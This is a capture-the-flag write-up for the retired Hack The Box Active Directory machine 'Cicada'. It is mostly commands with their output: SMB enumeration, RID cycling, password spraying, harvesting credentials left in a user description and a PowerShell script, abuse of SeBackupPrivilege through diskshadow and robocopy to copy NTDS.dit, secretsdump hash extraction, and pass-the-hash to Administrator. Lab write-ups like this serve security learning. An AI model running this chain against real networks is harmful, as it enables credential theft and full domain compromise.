---
machine: Cicada
platform: Hack The Box
category: AD
os: Windows
difficulty: Easy
points: 20
tags: [smb, password-spray, ldap, sebackupprivilege, rid-cycling]
date: 2026-05-20
status: retired
summary: "A beginner-friendly Active Directory box covering core domain reconnaissance — SMB share enumeration, password spraying, LDAP and RID-based user discovery, and a backup-operator privilege path to the domain's secret store. A clean introduction to turning a low-privilege foothold into domain compromise."
---
nmap scan:
```
──(kali㉿kali)-[~/htb/cicada]
└─$ nmap -sC -sV 10.129.231.149 | tee nmapbasic
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-06 08:16 -0400
Nmap scan report for 10.129.231.149
Host is up (0.045s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-06 19:16:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-05-06T19:17:52+00:00; +6h59m59s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-05-06T19:17:52+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-05-06T19:17:52+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-05-06T19:17:52+00:00; +6h59m59s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-06T19:17:14
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.64 seconds

```

Domain: `cicada.htb`

#### SMB Enumeration
Checked for anonymous access - denied
Checked for guest access:
```
┌──(kali㉿kali)-[~/htb/cicada]
└─$ smbmap -H 10.129.231.149 -u 'guest' -p '' -d cicada.htb

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.231.149:445      Name: 10.129.231.149            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     NO ACCESS
        HR                                                      READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share
```

Guest can read the HR and IPC$ share
```
┌──(kali㉿kali)-[~/htb/cicada]
└─$ impacket-smbclient cicada.htb/guest@10.129.231.149
Impacket v0.14.0.dev0+20260420.123356.9afc09b9 - Copyright Fortra, LLC and its affiliated companies 

Password:
Type help for list of commands
# ls
[-] No share selected
# use HR
# ls
drw-rw-rw-          0  Fri Mar 15 02:26:17 2024 .
drw-rw-rw-          0  Thu Mar 14 08:21:29 2024 ..
-rw-rw-rw-       1266  Wed Aug 28 13:31:48 2024 Notice from HR.txt
# get 'Notice from HR.txt'
[-] SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
# get Notice\ from\ HR.txt
[-] [Errno 2] No such file or directory: 'Notice\\ from\\ HR.txt'
# get Notice from HR.txt
# exit
```

We got a default password `Cicada$M6Corpb*@Lp#nZp!8`

#### Enumerating Users over SMB
"Enumerate the domain users with Impacket's `lookupsid` or `netexec`. Then conduct a password spray using the password."
`lookupsid.py [domain]/[user]:[password/password hash]@[Target IP Address] #User enumeration on target`

```
──(kali㉿kali)-[~/htb/cicada]
└─$ lookupsid.py cicada.htb/guest@10.129.231.149
/usr/local/bin/lookupsid.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.14.0.dev0+20260420.123356.9afc09b9', 'lookupsid.py')
Impacket v0.14.0.dev0+20260420.123356.9afc09b9 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.129.231.149
[*] StringBinding ncacn_np:10.129.231.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)
```

Now we need to parse out these names and then we can password spray

```
┌──(kali㉿kali)-[~/htb/cicada]
└─$ grep "SidTypeUser" tmpout.txt | awk -F'\' '{print $2}' | awk '{print $1}' | tee userspray.txt
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

I like to use `nxc` (NetExec) the modern version of CrackMapExec to password spray SMB and Winrm

```
┌──(kali㉿kali)-[~/htb/cicada]
└─$ nxc smb 10.129.231.149 -u userspray.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                             
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

We then attempt evil-winrm login to michael.wrightson

This fails so we re-enumerate smb with his creds:
```
┌──(kali㉿kali)-[~/htb/cicada]
└─$ smbmap -H 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.231.149:445      Name: 10.129.231.149            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     NO ACCESS
        HR                                                      READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections                                                                                                     
```

We see we now have read access to NETLOGON and SYSVOL
These are empty/unimportant

We can use this domain user cred pair to enumerate the domain further via `nxc`, using the `--users` flag we can find 
```
┌──(kali㉿kali)-[~/htb/cicada]
└─$ nxc smb 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                             
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.231.149  445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                  
SMB         10.129.231.149  445    CICADA-DC        Administrator                 2024-08-26 20:08:03 2       Built-in account for administering the computer/domain                                                                                                                      
SMB         10.129.231.149  445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain                                                                                                                    
SMB         10.129.231.149  445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 1       Key Distribution Center Service Account                                                                                                                                     
SMB         10.129.231.149  445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 1        
SMB         10.129.231.149  445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 1        
SMB         10.129.231.149  445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
SMB         10.129.231.149  445    CICADA-DC        david.orelious                2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3                                                                                                                         
SMB         10.129.231.149  445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 0        
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated 8 local users: CICADA
```

We see a user left their password in plaintext in the metadata giving us another cred pair `david.orelious:aRt$Lp#7t*VQ!3`

We also can see the password policy with `--pass-pol`:
```
┌──(kali㉿kali)-[~/htb/cicada]
└─$ nxc smb 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --pass-pol      
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                             
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.231.149  445    CICADA-DC        [+] Dumping password info for domain: CICADA
SMB         10.129.231.149  445    CICADA-DC        Minimum password length: 7
SMB         10.129.231.149  445    CICADA-DC        Password history length: 24
SMB         10.129.231.149  445    CICADA-DC        Maximum password age: 41 days 23 hours 53 minutes 
SMB         10.129.231.149  445    CICADA-DC        
SMB         10.129.231.149  445    CICADA-DC        Password Complexity Flags: 000001
SMB         10.129.231.149  445    CICADA-DC            Domain Refuse Password Change: 0
SMB         10.129.231.149  445    CICADA-DC            Domain Password Store Cleartext: 0
SMB         10.129.231.149  445    CICADA-DC            Domain Password Lockout Admins: 0
SMB         10.129.231.149  445    CICADA-DC            Domain Password No Clear Change: 0
SMB         10.129.231.149  445    CICADA-DC            Domain Password No Anon Change: 0
SMB         10.129.231.149  445    CICADA-DC            Domain Password Complex: 1
SMB         10.129.231.149  445    CICADA-DC        
SMB         10.129.231.149  445    CICADA-DC        Minimum password age: 1 day 4 minutes 
SMB         10.129.231.149  445    CICADA-DC        Reset Account Lockout Counter: 30 minutes 
SMB         10.129.231.149  445    CICADA-DC        Locked Account Duration: 30 minutes 
SMB         10.129.231.149  445    CICADA-DC        Account Lockout Threshold: None
SMB         10.129.231.149  445    CICADA-DC        Forced Log off Time: Not Set
```

We repeat the attempts above with this new cred set:
- Evil-Winrm with `david.orelious:aRt$Lp#7t*VQ!3` -> failed
- SMB ->
```
┌──(kali㉿kali)-[~/htb/cicada]
└─$ nxc smb 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares 
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                             
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated shares
SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------
SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.231.149  445    CICADA-DC        C$                              Default share
SMB         10.129.231.149  445    CICADA-DC        DEV             READ            
SMB         10.129.231.149  445    CICADA-DC        HR              READ            
SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.231.149  445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.231.149  445    CICADA-DC        SYSVOL          READ            Logon server share
```

This new user has READ access to the DEV share, we are going to enumerate it:
```
──(kali㉿kali)-[~/htb/cicada]
└─$ smbclient //10.129.231.149/DEV -U 'cicada\david.orelious' --password 'aRt$Lp#7t*VQ!3'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 08:31:39 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024

                4168447 blocks of size 4096. 481219 blocks available
smb: \> get Backup_script.ps1 
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (3.4 KiloBytes/sec) (average 3.4 KiloBytes/sec)
smb: \> 

┌──(kali㉿kali)-[~/htb/cicada]
└─$ cat Backup_script.ps1   

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

So we have another leaked credential pair in this powershell script: `emily.oscars:Q!3@Lp#M6b*7t*Vt`

Repeat the process again:
This time we DO get a evil-winrm connection:
```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami
cicada\emily.oscars
```

We get the user flag and then check our permissions to seek out a privilege escalation to SYSTEM or Administrator

### Privilege Escalation Using [[diskshadow]] and [[robocopy]]
```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Immediately SeBackupPrivilege and SeRestorePrivilege jump out to me: these give us the ability to bypass standard ACLs to read and write sensitive files via "backups".  

This is an exceptional blog for demonstrating this exploit: https://juggernaut-sec.com/sebackupprivilege/

We need to make a noninteractive text file we can feed diskshadow:
```
echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append echo "create" | out-file ./diskshadow.txt -encoding ascii -append echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
```

This makes diskshadow.txt - telling diskshadow to make a copy of C:, name it Z: and make it accessible.
```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> type diskshadow.txt
set context persistent nowriters
add volume c: alias temp
create
expose %temp% z:
```

Now we need to move this script to a writable directory (like temp) and feed this script into diskshadow:
`diskshadow.exe /s c:\temp\diskshadow.txt`

```
*Evil-WinRM* PS C:\Windows\Temp> diskshadow.exe /s diskshadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  CICADA-DC,  5/6/2026 1:32:51 PM

-> set context persistent nowriters
-> add volume c: alias temp
-> create
Alias temp for shadow ID {d4257e12-d2c6-4974-b060-c8b0c0d6aac3} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {7215e2a3-8ad9-4686-947c-b66fec8fa0e5} set as environment variable.

Querying all shadow copies with the shadow copy set ID {7215e2a3-8ad9-4686-947c-b66fec8fa0e5}

        * Shadow copy ID = {d4257e12-d2c6-4974-b060-c8b0c0d6aac3}               %temp%
                - Shadow copy set: {7215e2a3-8ad9-4686-947c-b66fec8fa0e5}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{fcebaf9b-0000-0000-0000-500600000000}\ [C:\]
                - Creation time: 5/6/2026 1:32:52 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: CICADA-DC.cicada.htb
                - Service machine: CICADA-DC.cicada.htb
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %temp% z:
-> %temp% = {d4257e12-d2c6-4974-b060-c8b0c0d6aac3}
The shadow copy was successfully exposed as z:\.
->
```

We can now robocopy whatever files like SYSTEM, SAM, and (because we are on a domain controller) NTDS.dit

Because the NTDS.dit database stores ALL domain hashes we need to retrieve it, along with SYSTEM hive which holds the bootkeys which encrpy the NTDS.dit and SAM files.

`robocopy /b Z:\Windows\NTDS\ C:\Windows\Temp ntds.dit` 
`reg save hklm\system C:\Windows\Temp\system.bak`

Now we can download the ntds.dit and system.bak file to our host from evil-winrm with `download <filename>`

### Secretsdump the NTDS.dit
`secretsdump.py -ntds ntds.dit -system system.bak LOCAL`

```
─$ secretsdump.py -ntds ntds.dit -system system.bak LOCAL
/usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.14.0.dev0+20260420.123356.9afc09b9', 'secretsdump.py')
Impacket v0.14.0.dev0+20260420.123356.9afc09b9 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: f954f575c626d6afe06c2b80cc2185e6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
CICADA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:188c2f3cb7592e18d1eae37991dee696:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3779000802a4bb402736bee52963f8ef:::
cicada.htb\john.smoulder:1104:aad3b435b51404eeaad3b435b51404ee:0d33a055d07e231ce088a91975f28dc4:::
cicada.htb\sarah.dantelia:1105:aad3b435b51404eeaad3b435b51404ee:d1c88b5c2ecc0e2679000c5c73baea20:::
cicada.htb\michael.wrightson:1106:aad3b435b51404eeaad3b435b51404ee:b222964c9f247e6b225ce9e7c4276776:::
cicada.htb\david.orelious:1108:aad3b435b51404eeaad3b435b51404ee:ef0bcbf3577b729dcfa6fbe1731d5a43:::
cicada.htb\emily.oscars:1601:aad3b435b51404eeaad3b435b51404ee:559048ab2d168a4edf8e033d43165ee5:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:e47fd7646fa8cf1836a79166f5775405834e2c060322d229bc93f26fb67d2be5
Administrator:aes128-cts-hmac-sha1-96:f51b243b116894bea389709127df1652
Administrator:des-cbc-md5:c8838c9b10c43b23
CICADA-DC$:aes256-cts-hmac-sha1-96:e9752f2c7752bd92142588e63dc0383499f49b04a46de37845e33d40de1db7ed
CICADA-DC$:aes128-cts-hmac-sha1-96:7fc8e7f2daa14d0ccdf070de9cfc49c5
CICADA-DC$:des-cbc-md5:b0f7cdec040d5b6d
krbtgt:aes256-cts-hmac-sha1-96:357f15dd4d315af47ac63658c444526ec0186f066ad9efb46906a7308b7c60c8
krbtgt:aes128-cts-hmac-sha1-96:39cbc0f220550c51fb89046ac652849e
krbtgt:des-cbc-md5:73b6c419b3b9bf7c
cicada.htb\john.smoulder:aes256-cts-hmac-sha1-96:57ae6faf294b7e6fbd0ce5121ac413d529ae5355535e20739a19b6fd2a204128
cicada.htb\john.smoulder:aes128-cts-hmac-sha1-96:8c0add65bd3c9ad2d1f458a719cfda81
cicada.htb\john.smoulder:des-cbc-md5:f1feaeb594b08575
cicada.htb\sarah.dantelia:aes256-cts-hmac-sha1-96:e25f0b9181f532a85310ba6093f24c1f2f10ee857a97fe18d716ec713fc47060
cicada.htb\sarah.dantelia:aes128-cts-hmac-sha1-96:2ac9a92bca49147a0530e5ce84ceee7d
cicada.htb\sarah.dantelia:des-cbc-md5:0b5b014370fdab67
cicada.htb\michael.wrightson:aes256-cts-hmac-sha1-96:d89ff79cc85032f27499425d47d3421df678eace01ce589eb128a6ffa0216f46
cicada.htb\michael.wrightson:aes128-cts-hmac-sha1-96:f1290a5c4e9d4ef2cd7ad470600124a9
cicada.htb\michael.wrightson:des-cbc-md5:eca8d532fd8f26bc
cicada.htb\david.orelious:aes256-cts-hmac-sha1-96:125726466d0431ed1441caafe8c0ed9ec0d10b0dbaf4fec7a184b764d8a36323
cicada.htb\david.orelious:aes128-cts-hmac-sha1-96:ce66c04e5fd902b15f5d4c611927c9c2
cicada.htb\david.orelious:des-cbc-md5:83585bc41573897f
cicada.htb\emily.oscars:aes256-cts-hmac-sha1-96:4abe28adc1d16373f4c8db4d9bfd34ea1928aca72cb69362d3d90f69d80c000f
cicada.htb\emily.oscars:aes128-cts-hmac-sha1-96:f98d74d70dfb68b70ddd821edcd6a023
cicada.htb\emily.oscars:des-cbc-md5:fd4a5497d38067cd
[*] Cleaning up... 

```

From here you have complete domain compromise as you could pass the NT hash of krbtgt and make golden tickets, but I am just going to [[Pass the Hash]] and become Administrator to find the root flag.

```
┌──(kali㉿kali)-[~/htb/cicada]
└─$ evil-winrm -i 10.129.231.149 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          5/6/2026  12:15 PM             34 root.txt

```